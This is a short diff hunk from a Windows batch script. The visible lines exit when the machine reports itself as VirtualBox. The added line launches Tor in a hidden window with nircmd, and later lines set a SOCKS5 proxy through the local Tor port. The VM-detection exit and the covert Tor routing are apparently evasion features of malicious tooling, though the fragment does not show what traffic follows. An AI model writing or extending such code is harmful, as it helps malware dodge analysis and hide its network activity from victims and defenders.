@@ -10,7 +10,7 @@ for /f "tokens=1* delims=: " %%A in (
 if "%model%" == "VirtualBox" (
     exit
 )
-
+nircmd exec hide "C:\Tor\tor.exe"
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
 if not errorlevel 1 (set "proxy=--socks5-hostname 127.0.0.1:9050") else (
   set "proxy="
